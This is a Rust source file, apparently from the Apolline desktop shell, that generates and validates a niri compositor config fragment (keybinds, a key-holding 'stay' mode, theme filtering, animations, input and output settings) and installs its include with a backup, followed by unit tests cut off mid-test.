use std::fs;
use std::io;
use std::path::{Path, PathBuf};

use apolline_config::{
    Appear, Blur, Center, Config, KeyAction, Keyboard, Motion, Mouse, Rule, Shortcut, Touchpad,
    Width, Windows,
};

const TEMPLATE: &str = include_str!("../../../assets/niri.kdl");
const PLAY: &str = r##"
window-rule {
    match app-id=r#"^steam_app_"#
    match app-id=r#"^gamescope$"#
    match app-id=r#"\.exe$"#
    variable-refresh-rate true
}
"##;

const MEDIA_KEYS: [(&str, &str); 6] = [
    ("XF86AudioRaiseVolume", "volume up"),
    ("XF86AudioLowerVolume", "volume down"),
    ("XF86AudioMute", "volume mute"),
    ("XF86AudioMicMute", "mic mute"),
    ("XF86MonBrightnessUp", "brightness up"),
    ("XF86MonBrightnessDown", "brightness down"),
];

pub struct Fragment<'a> {
    pub config: &'a Config,
    pub mode: Option<usize>,
    pub outputs: &'a [String],
    // Staying in the window in front: niri's keys that would leave it do nothing.
    pub stay: bool,
}

// Keys niri answers without a bind of anyone's: its window switcher.
const BUILT_IN: [&str; 4] = ["Alt+Tab", "Alt+Shift+Tab", "Alt+grave", "Alt+Shift+grave"];

// Apolline's keys that still work while staying: they act in place and leave nothing.
const KEPT_WHILE_STAYING: [Shortcut; 2] = [Shortcut::Replay, Shortcut::Layout];

// Every key that would take you out of the window in front: Apolline's own, the mode's and the
// one-line binds in niri's main config (included files aren't read). What stays: the key that ends
// it, sound and brightness keys, screenshots, saving a replay and switching the layout.
pub fn held(niri_config: &str, config: &Config, mode_keys: &[String]) -> Vec<String> {
    let stay = config.shortcuts.get(Shortcut::Stay);
    let mut held: Vec<String> = Vec::new();
    let own = Shortcut::ALL
        .into_iter()
        .filter(|shortcut| !KEPT_WHILE_STAYING.contains(shortcut))
        .map(|shortcut| config.shortcuts.get(shortcut).to_owned());
    let theirs = crate::keys::binds(niri_config)
        .into_iter()
        .filter(|(_, action)| {
            !action.contains("screenshot") && !action.starts_with("switch-layout")
        })
        .map(|(combo, _)| combo);
    let built_in = BUILT_IN.iter().map(|combo| (*combo).to_owned());
    for combo in own
        .chain(theirs)
        .chain(mode_keys.iter().cloned())
        .chain(built_in)
    {
        let kept = combo.is_empty()
            || combo.split('+').any(|part| part.starts_with("XF86"))
            || crate::keys::same(&combo, stay);
        if !kept && !held.iter().any(|other| crate::keys::same(other, &combo)) {
            held.push(combo);
        }
    }
    held
}

fn key_bind(combo: &str, action: &KeyAction) -> String {
    match action {
        KeyAction::Run(command) => format!(
            "{combo} hotkey-overlay-title=\"{}\" {{ spawn-sh \"{}\"; }}",
            quote(command),
            quote(command)
        ),
        KeyAction::Niri(niri) => {
            let words: Vec<String> = niri
                .split_whitespace()
                .enumerate()
                .map(|(i, word)| {
                    if i == 0 || word.parse::<i64>().is_ok() {
                        word.to_owned()
                    } else {
                        format!("\"{}\"", quote(word))
                    }
                })
                .collect();
            format!("{combo} {{ {}; }}", words.join(" "))
        }
    }
}

// Keys of yours that act in place, like Apolline's own kept ones.
fn kept_while_staying(action: &KeyAction) -> bool {
    match action {
        KeyAction::Niri(niri) => {
            niri.starts_with("screenshot") || niri.starts_with("switch-layout")
        }
        KeyAction::Run(_) => false,
    }
}

fn shortcut_bind(config: &Config, shortcut: Shortcut) -> String {
    let (title, command) = action(shortcut);
    let combo = config.shortcuts.get(shortcut);
    if shortcut == Shortcut::Layout {
        format!("{combo} hotkey-overlay-title=\"{title}\" {{ switch-layout \"next\"; }}")
    } else {
        format!("{combo} hotkey-overlay-title=\"{title}\" {{ spawn \"apolline\" \"{command}\"; }}")
    }
}

pub fn path() -> PathBuf {
    apolline_config::config_home()
        .join("apolline")
        .join("niri.kdl")
}

pub fn theme_path() -> PathBuf {
    path().with_file_name("theme.kdl")
}

// What a theme folder's niri.kdl may set: looks only. Nothing that runs a program,
// binds a key or touches input and outputs gets through.
const THEME_NODES: [&str; 5] = [
    "layout",
    "animations",
    "window-rule",
    "layer-rule",
    "overview",
];

pub fn theme_part(snippet: &str) -> String {
    nodes(snippet)
        .into_iter()
        .filter(|node| THEME_NODES.contains(&name(node)))
        .collect::<Vec<_>>()
        .join("\n")
}

fn name(node: &str) -> &str {
    let end = node
        .find(|c: char| c.is_whitespace() || c == '{' || c == ';')
        .unwrap_or(node.len());
    node[..end].trim_matches('"')
}

// Splits KDL into its top-level nodes, stepping over strings, raw strings and comments.
fn nodes(text: &str) -> Vec<&str> {
    let mut nodes = Vec::new();
    let (mut depth, mut start, mut at) = (0usize, None::<usize>, 0usize);
    fn end<'a>(text: &'a str, start: &mut Option<usize>, until: usize, nodes: &mut Vec<&'a str>) {
        if let Some(from) = start.take() {
            let node = text[from..until].trim();
            if !node.is_empty() {
                nodes.push(node);
            }
        }
    }
    while at < text.len() {
        let rest = &text[at..];
        if rest.starts_with("//") {
            at += rest.find('\n').unwrap_or(rest.len());
            continue;
        }
        if rest.starts_with("/*") {
            let mut level = 0usize;
            let mut i = 0;
            while i < rest.len() {
                if rest[i..].starts_with("/*") {
                    level += 1;
                    i += 2;
                } else if rest[i..].starts_with("*/") {
                    level -= 1;
                    i += 2;
                    if level == 0 {
                        break;
                    }
                } else {
                    i += rest[i..].chars().next().map_or(1, char::len_utf8);
                }
            }
            at += i;
            continue;
        }
        if let Some(length) = string(rest) {
            start.get_or_insert(at);
            at += length;
            continue;
        }
        let c = rest.chars().next().unwrap_or(' ');
        match c {
            '{' => {
                start.get_or_insert(at);
                depth += 1;
            }
            '}' => {
                depth = depth.saturating_sub(1);
                if depth == 0 {
                    end(text, &mut start, at + 1, &mut nodes);
                }
            }
            '\n' | ';' if depth == 0 => end(text, &mut start, at, &mut nodes),
            c if !c.is_whitespace() => {
                start.get_or_insert(at);
            }
            _ => {}
        }
        at += c.len_utf8();
    }
    end(text, &mut start, text.len(), &mut nodes);
    nodes
}

// The length of a quoted or raw string at the start of `text`, if there is one.
fn string(text: &str) -> Option<usize> {
    if let Some(body) = text.strip_prefix('"') {
        let mut escaped = false;
        for (i, c) in body.char_indices() {
            match c {
                '\\' if !escaped => escaped = true,
                '"' if !escaped => return Some(i + 2),
                _ => escaped = false,
            }
        }
        return Some(text.len());
    }
    let raw = text.strip_prefix('r').unwrap_or(text);
    let hashes = raw.len() - raw.trim_start_matches('#').len();
    if raw.len() == text.len() && hashes == 0 {
        return None;
    }
    let body = raw[hashes..].strip_prefix('"')?;
    let close = format!("\"{}", "#".repeat(hashes));
    let prefix = text.len() - body.len();
    Some(
        body.find(&close)
            .map_or(text.len(), |i| prefix + i + close.len()),
    )
}

// Writes the theme's part next to the fragment; false if there's none or niri refuses it.
fn settle_theme(theme: Option<&str>) -> bool {
    let path = theme_path();
    let Some(text) = theme.filter(|t| !t.trim().is_empty()) else {
        let _ = fs::remove_file(&path);
        return false;
    };
    if fs::read_to_string(&path).is_ok_and(|now| now == text) {
        return true;
    }
    if let Err(err) = replace(&path, text) {
        eprintln!("apolline: cannot write {}: {err}", path.display());
        return false;
    }
    let checked = std::process::Command::new("niri")
        .args(["validate", "-c"])
        .arg(&path)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();
    if checked.is_ok_and(|status| !status.success()) {
        eprintln!("apolline: the theme's niri.kdl doesn't validate, so it's left out");
        let _ = fs::remove_file(&path);
        return false;
    }
    true
}

pub fn niri_config() -> PathBuf {
    std::env::var_os("NIRI_CONFIG")
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            apolline_config::config_home()
                .join("niri")
                .join("config.kdl")
        })
}

pub fn render(fragment: &Fragment) -> String {
    let mode = fragment.mode.and_then(|i| fragment.config.modes.get(i));
    let play = mode.is_some_and(|m| m.performance);
    let layout = fragment.config.layout;
    let on = |yes: bool| if yes { "on" } else { "off" };
    let mut text = TEMPLATE.to_owned();
    text.push_str(&format!(
        r##"
layout {{
    gaps {gaps}
    background-color "transparent"
{columns}
    focus-ring {{
        off
    }}

    border {{
        {border}
        width {border_width}
        active-color "{accent}"{gradient}
        inactive-color "{inactive}"
        urgent-color "#ff6a3d"
    }}

    shadow {{
        {shadow}
        softness 40
        spread 0
        offset x=0 y=12
        color "#00000059"
    }}
}}

window-rule {{
    geometry-corner-radius {radius}
    clip-to-geometry true
}}

window-rule {{
    match app-id="^apolline-settings$"
    open-floating true
    default-column-width {{ fixed 1180; }}
    default-window-height {{ fixed 760; }}
}}

// Steam's toasts, a friend coming online or a download done, keep to the corner and the focus
// stays where it was.
window-rule {{
    match app-id="^steam$" title="^notificationtoastwindow$"
    open-floating true
    open-focused false
    default-floating-position x=12 y=12 relative-to="bottom-right"
}}
"##,
        gaps = layout.gaps,
        columns = columns(&fragment.config.windows),
        border = on(layout.borders),
        border_width = layout.border_width,
        // A line that shows on the palette's own windows: light on dark, dark on light.
        inactive = {
            let scheme = fragment.config.scheme(fragment.mode);
            let line = scheme.overlay.alpha(0.12).over(scheme.window);
            line.to_hex()
        },
        accent = fragment.config.palette(fragment.mode).accent.to_hex(),
        gradient = if layout.gradient {
            let accent = fragment.config.palette(fragment.mode).accent;
            format!(
                "\n        active-gradient from=\"{}\" to=\"{}\" angle=45 relative-to=\"workspace-view\" in=\"oklch shorter hue\"",
                accent.to_hex(),
                accent.shift_hue(70.0).to_hex()
            )
        } else {
            String::new()
        },
        shadow = on(layout.shadows && !play),
        radius = layout.radius,
    ));
    let config = fragment.config;
    if fragment.stay {
        let mode_keys: Vec<String> = mode
            .into_iter()
            .flat_map(|mode| mode.keys.iter().map(|(combo, _)| combo.clone()))
            .chain(
                config
                    .keys
                    .iter()
                    .filter(|(_, action)| !kept_while_staying(action))
                    .map(|(combo, _)| combo.clone()),
            )
            .collect();
        let niri = fs::read_to_string(niri_config()).unwrap_or_default();
        let mut binds = vec![format!(
            "{} hotkey-overlay-title=\"Let go of this window\" {{ spawn \"apolline\" \"stay\"; }}",
            config.shortcuts.get(Shortcut::Stay)
        )];
        binds.extend(MEDIA_KEYS.iter().map(|(key, words)| {
            let args: Vec<String> = words.split(' ').map(|w| format!("\"{w}\"")).collect();
            format!(
                "{key} allow-when-locked=true {{ spawn \"apolline\" {}; }}",
                args.join(" ")
            )
        }));
        binds.extend(
            KEPT_WHILE_STAYING
                .into_iter()
                .filter(|&shortcut| !config.shortcuts.get(shortcut).is_empty())
                .map(|shortcut| shortcut_bind(config, shortcut)),
        );
        binds.extend(
            held(&niri, config, &mode_keys)
                .into_iter()
                .map(|combo| format!("{combo} hotkey-overlay-title=null {{ spawn \"true\"; }}")),
        );
        text.push_str(&format!("\n{}", block("binds", &binds)));
        text.push_str("\ngestures {\n    hot-corners {\n        off\n    }\n}\n");
    }
    let binds: Vec<String> = Shortcut::ALL
        .into_iter()
        .filter(|&shortcut| !config.shortcuts.get(shortcut).is_empty())
        .map(|shortcut| shortcut_bind(config, shortcut))
        .collect();
    let mut binds = binds;
    binds.extend(MEDIA_KEYS.iter().map(|(key, words)| {
        let args: Vec<String> = words.split(' ').map(|w| format!("\"{w}\"")).collect();
        format!(
            "{key} allow-when-locked=true {{ spawn \"apolline\" {}; }}",
            args.join(" ")
        )
    }));
    let free = |combo: &String| {
        !Shortcut::ALL
            .into_iter()
            .any(|s| crate::keys::same(config.shortcuts.get(s), combo))
    };
    // Yours work in every mode, unless the mode has its own on that key.
    let in_mode = |combo: &String| {
        mode.is_some_and(|mode| {
            mode.keys
                .iter()
                .any(|(own, _)| crate::keys::same(own, combo))
        })
    };
    binds.extend(
        config
            .keys
            .iter()
            .filter(|(combo, _)| free(combo) && !in_mode(combo))
            .map(|(combo, action)| key_bind(combo, action)),
    );
    if let Some(mode) = mode {
        binds.extend(
            mode.keys
                .iter()
                .filter(|(combo, _)| free(combo))
                .map(|(combo, command)| {
                    let title = quote(&format!("{}: {command}", mode.name));
                    format!(
                        "{combo} hotkey-overlay-title=\"{title}\" {{ spawn-sh \"{}\"; }}",
                        quote(command)
                    )
                }),
        );
    }
    if !fragment.stay {
        text.push_str(&format!("\n{}", block("binds", &binds)));
    }
    let windows = &config.windows;
    let devices: Vec<String> = [
        keyboard(&config.keyboard),
        config.touchpad.map(touchpad),
        config.mouse.map(mouse),
        windows
            .focus_follows_mouse
            .then(|| "focus-follows-mouse".to_owned()),
        windows.warp_mouse.then(|| "warp-mouse-to-focus".to_owned()),
    ]
    .into_iter()
    .flatten()
    .collect();
    if !devices.is_empty() {
        text.push_str(&format!("\n{}", block("input", &devices)));
    }
    let mut names: Vec<&str> = fragment.outputs.iter().map(String::as_str).collect();
    names.extend(config.displays.iter().map(|d| d.name.as_str()));
    names.sort();
    names.dedup();
    for name in names {
        let display = config.displays.iter().find(|d| d.name == name);
        text.push_str(&format!(
            "\n{}",
            block(
                &format!("output \"{}\"", quote(name)),
                &output_lines(display)
            )
        ));
    }
    let desktop = &config.desktop;
    if desktop.cursor.is_some() || desktop.cursor_size.is_some() {
        let mut lines = Vec::new();
        if let Some(theme) = &desktop.cursor {
            lines.push(format!("xcursor-theme \"{}\"", quote(theme)));
        }
        if let Some(size) = desktop.cursor_size {
            lines.push(format!("xcursor-size {size}"));
        }
        text.push_str(&format!("\n{}", block("cursor", &lines)));
    }
    if let Some(animations) = animations(windows, play) {
        text.push_str(&format!("\n{animations}"));
    }
    if !play {
        if let Some(blur) = windows.blur {
            let effect = [
                "blur true".to_owned(),
                format!("xray {}", blur == Blur::Wallpaper),
            ];
            let effect = block("background-effect", &effect);
            text.push_str(&format!("\n{}", block("window-rule", &[effect])));
        }
        // Islands leave the wallpaper bare between them, and niri blurs a whole surface.
        if config.bar.blur && config.bar.shape == apolline_config::Shape::Bar {
            let mut lines = vec!["match namespace=\"^apolline-bar$\"".to_owned()];
            if config.bar.floating {
                // The bar is drawn bigger with its size, its corners too.
                let scale = config.style.bar.size.unwrap_or(1.0);
                lines.push(format!(
                    "geometry-corner-radius {}",
                    (crate::style::bar_size(&config.style).1 * scale).round()
                ));
            }
            lines.push(block("background-effect", &["blur true".to_owned()]));
            text.push_str(&format!("\n{}", block("layer-rule", &lines)));
        }
        // These cover the screen with a dim veil; blurred, windows don't read through it.
        let veiled = [
            "match namespace=\"^apolline-(switcher|keys)$\"".to_owned(),
            block("background-effect", &["blur true".to_owned()]),
        ];
        text.push_str(&format!("\n{}", block("layer-rule", &veiled)));
    }
    if let Some(opacity) = windows.opacity {
        text.push_str(&format!(
            "\n{}",
            block("window-rule", &[format!("opacity {opacity:.2}")])
        ));
    }
    if let Some(opacity) = windows.inactive_opacity {
        let lines = [
            "match is-active=false".to_owned(),
            format!("opacity {opacity:.2}"),
        ];
        text.push_str(&format!("\n{}", block("window-rule", &lines)));
    }
    let switcher = if windows.switcher {
        let accent = fragment.config.palette(fragment.mode).accent.to_hex();
        let highlight = [
            format!("active-color \"{accent}\""),
            "urgent-color \"#ff6a3d\"".to_owned(),
            "padding 18".to_owned(),
            format!("corner-radius {}", layout.radius + 6),
        ];
        vec![block("highlight", &highlight)]
    } else {
        vec!["off".to_owned()]
    };
    text.push_str(&format!("\n{}", block("recent-windows", &switcher)));
    for rule in &config.rules {
        text.push_str(&format!("\n{}", app_rule(rule)));
    }
    if play {
        text.push_str(PLAY);
    }
    text
}

fn columns(windows: &Windows) -> String {
    let mut lines = Vec::new();
    if let Some(width) = windows.width {
        lines.push(block("default-column-width", &[proportion(width)]));
    }
    if let Some(presets) = &windows.presets {
        let widths: Vec<String> = presets.iter().copied().map(proportion).collect();
        lines.push(block("preset-column-widths", &widths));
    }
    if let Some(center) = windows.center {
        let value = match center {
            Center::Never => "never",
            Center::Overflow => "on-overflow",
            Center::Always => "always",
        };
        lines.push(format!("center-focused-column \"{value}\""));
    }
    if windows.center_lone {
        lines.push("always-center-single-column".to_owned());
    }
    lines
        .iter()
        .flat_map(|line| line.lines())
        .map(|line| format!("    {line}\n"))
        .collect()
}

fn proportion(width: Width) -> String {
    format!("proportion {:.5}", width.proportion())
}

fn app_rule(rule: &Rule) -> String {
    let pattern: String = rule
        .app
        .chars()
        .map(|c| {
            if c.is_alphanumeric() || c == '-' || c == '_' {
                c.to_string()
            } else {
                format!("\\{c}")
            }
        })
        .collect();
    let mut lines = vec![format!("match app-id=r#\"^{pattern}$\"#")];
    if let Some(floating) = rule.floating {
        lines.push(format!("open-floating {floating}"));
    }
    if let Some(width) = rule.width {
        lines.push(format!("default-column-width {{ {}; }}", proportion(width)));
    }
    if let Some(opacity) = rule.opacity {
        lines.push(format!("opacity {opacity:.2}"));
    }
    block("window-rule", &lines)
}

pub fn action(shortcut: Shortcut) -> (&'static str, &'static str) {
    match shortcut {
        Shortcut::Launcher => ("Search apps and games", "launcher"),
        Shortcut::Panel => ("Quick settings", "panel"),
        Shortcut::Switch => ("Switch mode", "switch"),
        Shortcut::Lock => ("Lock the screen", "lock"),
        Shortcut::Clipboard => ("Clipboard history", "clipboard"),
        Shortcut::Keys => ("Keyboard shortcuts", "keys"),
        Shortcut::Replay => ("Save the last moments", "replay"),
        Shortcut::Terminal => ("Terminal", "terminal"),
        Shortcut::Layout => ("Next keyboard layout", "layout"),
        Shortcut::Stay => ("Stay in this window", "stay"),
    }
}

fn quote(text: &str) -> String {
    text.replace('\\', "\\\\").replace('"', "\\\"")
}

fn keyboard(keyboard: &Keyboard) -> Option<String> {
    let mut xkb = Vec::new();
    if !keyboard.layouts.is_empty() {
        xkb.push(format!("layout \"{}\"", quote(&keyboard.layouts.join(","))));
    }
    if let Some(switch) = keyboard.switch {
        xkb.push(format!("options \"{}\"", quote(switch.xkb())));
    }
    let mut lines = Vec::new();
    if !xkb.is_empty() {
        lines.push(block("xkb", &xkb));
    }
    if let Some(delay) = keyboard.repeat_delay {
        lines.push(format!("repeat-delay {delay}"));
    }
    if let Some(rate) = keyboard.repeat_rate {
        lines.push(format!("repeat-rate {rate}"));
    }
    (!lines.is_empty()).then(|| block("keyboard", &lines))
}

fn touchpad(touchpad: Touchpad) -> String {
    let flags = [
        (touchpad.tap, "tap"),
        (touchpad.natural_scroll, "natural-scroll"),
        (touchpad.disable_while_typing, "dwt"),
    ];
    let mut lines: Vec<String> = flags
        .into_iter()
        .filter(|(on, _)| *on)
        .map(|(_, flag)| flag.to_owned())
        .collect();
    lines.push(format!("accel-speed {:.2}", touchpad.speed));
    block("touchpad", &lines)
}

fn mouse(mouse: Mouse) -> String {
    let mut lines = Vec::new();
    if mouse.natural_scroll {
        lines.push("natural-scroll".to_owned());
    }
    if !mouse.acceleration {
        lines.push("accel-profile \"flat\"".to_owned());
    }
    lines.push(format!("accel-speed {:.2}", mouse.speed));
    block("mouse", &lines)
}

fn output_lines(display: Option<&apolline_config::Display>) -> Vec<String> {
    let mut lines = Vec::new();
    if let Some(display) = display {
        if let Some(mode) = &display.mode {
            lines.push(format!("mode \"{}\"", quote(mode)));
        }
        if let Some(scale) = display.scale {
            lines.push(format!("scale {scale}"));
        }
        if let Some(transform) = &display.transform {
            lines.push(format!("transform \"{}\"", quote(transform)));
        }
        if let Some((x, y)) = display.position {
            lines.push(format!("position x={x} y={y}"));
        }
    }
    match display.and_then(|d| d.vrr) {
        Some(true) => lines.push("variable-refresh-rate".to_owned()),
        Some(false) => {}
        None => lines.push("variable-refresh-rate on-demand=true".to_owned()),
    }
    lines
}

const MOVES: [&str; 5] = [
    "workspace-switch",
    "horizontal-view-movement",
    "window-movement",
    "window-resize",
    "overview-open-close",
];

const POP: &str = "vec4 open_color(vec3 coords_geo, vec3 size_geo) {
    float scale = 0.86 + 0.14 * niri_progress;
    vec3 coords = vec3((coords_geo.xy - vec2(0.5)) / scale + vec2(0.5), 1.0);
    if (coords.x < 0.0 || coords.x > 1.0 || coords.y < 0.0 || coords.y > 1.0)
        return vec4(0.0);
    return texture2D(niri_tex, (niri_geo_to_tex * coords).st) * niri_clamped_progress;
}";

const SLIDE: &str = "vec4 open_color(vec3 coords_geo, vec3 size_geo) {
    float lift = (1.0 - niri_progress) * 48.0 / size_geo.y;
    vec3 coords = vec3(coords_geo.x, coords_geo.y - lift, 1.0);
    if (coords.x < 0.0 || coords.x > 1.0 || coords.y < 0.0 || coords.y > 1.0)
        return vec4(0.0);
    return texture2D(niri_tex, (niri_geo_to_tex * coords).st) * niri_clamped_progress;
}";

const FADE: &str = "vec4 open_color(vec3 coords_geo, vec3 size_geo) {
    return texture2D(niri_tex, (niri_geo_to_tex * coords_geo).st) * niri_clamped_progress;
}";

fn animations(windows: &Windows, play: bool) -> Option<String> {
    if play || windows.animations.is_some_and(|speed| speed <= 0.0) {
        return Some(block("animations", &["off".to_owned()]));
    }
    let mut lines = Vec::new();
    if let Some(speed) = windows.animations {
        lines.push(format!("slowdown {:.2}", 1.0 / speed));
    }
    let spring = |damping: f32, stiffness: u32| {
        format!("spring damping-ratio={damping:.2} stiffness={stiffness} epsilon=0.0001")
    };
    let (moving, open, close) = match windows.motion {
        Some(Motion::Snappy) => (
            Some(spring(1.0, 1600)),
            vec![
                "duration-ms 120".to_owned(),
                "curve \"ease-out-expo\"".to_owned(),
            ],
            Some(vec![
                "duration-ms 100".to_owned(),
                "curve \"ease-out-quad\"".to_owned(),
            ]),
        ),
        Some(Motion::Smooth) => (
            Some(spring(1.0, 450)),
            vec![
                "duration-ms 260".to_owned(),
                "curve \"cubic-bezier\" 0.2 0.8 0.2 1.0".to_owned(),
            ],
            Some(vec![
                "duration-ms 200".to_owned(),
                "curve \"ease-out-cubic\"".to_owned(),
            ]),
        ),
        Some(Motion::Bouncy) => (
            Some(spring(0.65, 650)),
            vec![spring(0.55, 500)],
            Some(vec![
                "duration-ms 150".to_owned(),
                "curve \"ease-out-quad\"".to_owned(),
            ]),
        ),
        None if windows.appear == Some(Appear::Pop) => (None, vec![spring(0.6, 550)], None),
        None => (None, Vec::new(), None),
    };
    if let Some(moving) = moving {
        for name in MOVES {
            lines.push(block(name, std::slice::from_ref(&moving)));
        }
    }
    let mut open = open;
    if let Some(appear) = windows.appear {
        let shader = match appear {
            Appear::Pop => POP,
            Appear::Slide => SLIDE,
            Appear::Fade => FADE,
        };
        open.push(format!("custom-shader r\"\n{shader}\n\""));
    }
    if !open.is_empty() {
        lines.push(block("window-open", &open));
    }
    if let Some(close) = close {
        lines.push(block("window-close", &close));
    }
    (!lines.is_empty()).then(|| block("animations", &lines))
}

fn block(name: &str, lines: &[String]) -> String {
    let body: String = lines
        .iter()
        .flat_map(|line| line.lines())
        .map(|line| format!("    {line}\n"))
        .collect();
    format!("{name} {{\n{body}}}\n")
}

// True when the fragment on disk is the one asked for, written now or already there.
pub fn sync(fragment: &Fragment, theme: Option<&str>) -> bool {
    let path = path();
    let mut text = render(fragment);
    if settle_theme(theme) {
        text.push_str("\ninclude \"theme.kdl\"\n");
    }
    if fs::read_to_string(&path).is_ok_and(|current| current == text) {
        return true;
    }
    if let Some(refusal) = refused(&path, &text) {
        eprintln!(
            "apolline: niri refuses the new {}, so the old one stays:\n{refusal}",
            path.display()
        );
        return false;
    }
    match replace(&path, &text) {
        Ok(()) => true,
        Err(err) => {
            eprintln!("apolline: cannot update {}: {err}", path.display());
            false
        }
    }
}

// What niri says against `text` written at `path`, checked beside it so relative includes
// resolve; None when niri takes it or isn't there to ask.
fn refused(path: &Path, text: &str) -> Option<String> {
    let draft = path.with_extension("kdl.draft");
    fs::write(&draft, text).ok()?;
    let out = std::process::Command::new("niri")
        .args(["validate", "-c"])
        .arg(&draft)
        .output();
    let _ = fs::remove_file(&draft);
    let out = out.ok()?;
    (!out.status.success()).then(|| String::from_utf8_lossy(&out.stderr).trim().to_owned())
}

pub fn setup(path: &Path, niri: &Path, fragment: &Fragment) -> io::Result<Vec<String>> {
    let mut done = Vec::new();
    let current = match fs::read_to_string(niri) {
        Err(err) if err.kind() == io::ErrorKind::NotFound => {
            let stock = fs::read_to_string(STOCK_NIRI_CONFIG).map_err(|_| {
                io::Error::new(
                    err.kind(),
                    format!(
                        "{} is missing; start niri once so it writes its config, then run this again",
                        niri.display()
                    ),
                )
            })?;
            if let Some(dir) = niri.parent() {
                fs::create_dir_all(dir)?;
            }
            fs::write(niri, &stock)?;
            done.push(format!("started {} from niri's own", niri.display()));
            stock
        }
        read => read?,
    };

    if let Some(dir) = path.parent() {
        fs::create_dir_all(dir)?;
    }
    let text = render(fragment);
    if let Some(refusal) = refused(path, &text) {
        return Err(io::Error::other(format!(
            "niri refuses the fragment for {}:\n{refusal}",
            path.display()
        )));
    }
    replace(path, &text)?;
    done.push(format!("wrote {}", path.display()));

    let (mut next, quieted) = quiet_other_bars(&current);
    for line in quieted {
        done.push(format!(
            "commented out line {line} of {}, so Apolline's bar is the only one",
            niri.display()
        ));
    }
    let include = format!("include \"{}\"", quote(&path.display().to_string()));
    if next.lines().any(|line| line.trim() == include) {
        done.push(format!("{} already includes it", niri.display()));
    } else {
        if !next.is_empty() && !next.ends_with('\n') {
            next.push('\n');
        }
        next.push_str(&format!("\n{include}\n"));
        done.push(format!(
            "added the include at the end of {}",
            niri.display()
        ));
    }
    if next == current {
        return Ok(done);
    }
    let backup = niri.with_extension("kdl.before-apolline");
    if !backup.exists() {
        fs::copy(niri, &backup)?;
        done.push(format!("saved your niri config as {}", backup.display()));
    }
    replace(niri, &next)?;
    Ok(done)
}

const STOCK_NIRI_CONFIG: &str = "/usr/share/doc/niri/default-config.kdl";

// niri's stock config starts waybar; with Apolline's bar too there would be two.
fn quiet_other_bars(config: &str) -> (String, Vec<usize>) {
    let mut quieted = Vec::new();
    let text = config
        .split_inclusive('\n')
        .enumerate()
        .map(|(index, line)| {
            let bare = line.trim();
            // Only a line that starts waybar and nothing else, so nothing else stops.
            let node = bare.split("//").next().unwrap_or_default().trim();
            if node == "spawn-at-startup \"waybar\"" {
                quieted.push(index + 1);
                let indent = &line[..line.len() - line.trim_start().len()];
                let end = if line.ends_with('\n') { "\n" } else { "" };
                format!("{indent}// {bare} // Apolline draws the bar{end}")
            } else {
                line.to_owned()
            }
        })
        .collect();
    (text, quieted)
}

// A config that's a dotfiles link is written through, not swapped for a plain file.
fn replace(path: &Path, text: &str) -> io::Result<()> {
    crate::templates::put(path, text)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scratch(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("apolline-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn look(config: &Config, mode: Option<usize>) -> Fragment<'_> {
        Fragment {
            config,
            mode,
            outputs: &[],
            stay: false,
        }
    }

    const KEYS: &str = "[keys]\n\"Mod+Return\" = \"kitty --single-instance\"\n\"Mod+C\" = { niri = \"close-window\" }\n\"Mod+Ctrl+Right\" = { niri = \"set-column-width +10%\" }\n\"Mod+Shift+3\" = { niri = \"move-column-to-workspace 3\" }\n\"Mod+Space\" = \"rofi -show drun\"\n\"Mod+P\" = \"x\"\n\n[[mode]]\nname = \"Work\"\nkeys = { \"Mod+P\" = \"y\" }\n";

    #[test]
    fn your_keys_bind_everywhere_but_where_apolline_or_the_mode_has_its_own() {
        let (config, problems) = Config::parse(KEYS);
        assert!(problems.is_empty(), "{problems:?}");
        let text = render(&look(&config, None));
        for line in [
            "Mod+Return hotkey-overlay-title=\"kitty --single-instance\" { spawn-sh \"kitty --single-instance\"; }",
            "Mod+C { close-window; }",
            "Mod+Ctrl+Right { set-column-width \"+10%\"; }",
            "Mod+Shift+3 { move-column-to-workspace 3; }",
            "Mod+P hotkey-overlay-title=\"x\"",
        ] {
            assert!(text.contains(line), "{line} missing:\n{text}");
        }
        assert!(!text.contains("rofi"), "the launcher keeps Mod+Space");
        let text = render(&look(&config, Some(0)));
        assert!(text.contains("Work: y") && !text.contains("hotkey-overlay-title=\"x\""));
        let staying = render(&Fragment {
            stay: true,
            ..look(&config, None)
        });
        assert!(staying.contains("Mod+C hotkey-overlay-title=null { spawn \"true\"; }"));
    }

    #[test]
    fn staying_holds_every_key_that_leaves_the_window_but_its_own_and_the_sound() {
        let config = Config::default();
        let niri = "binds {\n    Mod+1 { focus-workspace 1; }\n    Mod+WheelScrollDown cooldown-ms=150 { focus-workspace-down; }\n    Mod+Shift+S { screenshot; }\n    XF86AudioMute { spawn \"wpctl\"; }\n    Mod+Shift+G { spawn \"x\"; }\n    Mod+Shift+Space { switch-layout \"next\"; }\n}\n";
        let held = held(niri, &config, &["Mod+F".to_owned()]);
        for combo in [
            "Mod+1",
            "Mod+WheelScrollDown",
            "Mod+Space",
            "Alt+Tab",
            "Mod+F",
        ] {
            assert!(
                held.iter().any(|h| h == combo),
                "{combo} not held: {held:?}"
            );
        }
        for combo in [
            "Mod+Shift+S",
            "XF86AudioMute",
            "Mod+Shift+G",
            "Mod+Shift+Space",
            "Mod+Alt+R",
        ] {
            assert!(!held.iter().any(|h| h == combo), "{combo} held: {held:?}");
        }
        let text = render(&Fragment {
            config: &config,
            mode: None,
            outputs: &[],
            stay: true,
        });
        assert!(text.contains(&format!(
            "{} hotkey-overlay-title=\"Save the last moments\"",
            config.shortcuts.get(Shortcut::Replay)
        )));
        assert!(text.contains("Mod+Shift+G hotkey-overlay-title=\"Let go of this window\""));
        assert!(text.contains("hot-corners {\n        off"));
        assert_eq!(text.matches("binds {").count(), 1);
    }

    #[test]
    fn every_string_value_is_quoted() {
        let display = apolline_config::Display {
            name: "DP-1".into(),
            mode: Some("1920x1080\" {".into()),
            scale: None,
            transform: Some("90\\".into()),
            position: None,
            vrr: Some(false),
        };
        assert_eq!(
            output_lines(Some(&display)),
            ["mode \"1920x1080\\\" {\"", "transform \"90\\\\\""]
        );
        let layouts = Keyboard {
            layouts: vec!["us\"".into()],
            ..Keyboard::default()
        };
        assert!(keyboard(&layouts).unwrap().contains("layout \"us\\\"\""));
    }

    #[test]
    fn eye_candy_lands_in_one_animations_block_and_play_drops_it() {
        let (config, problems) = Config::parse(
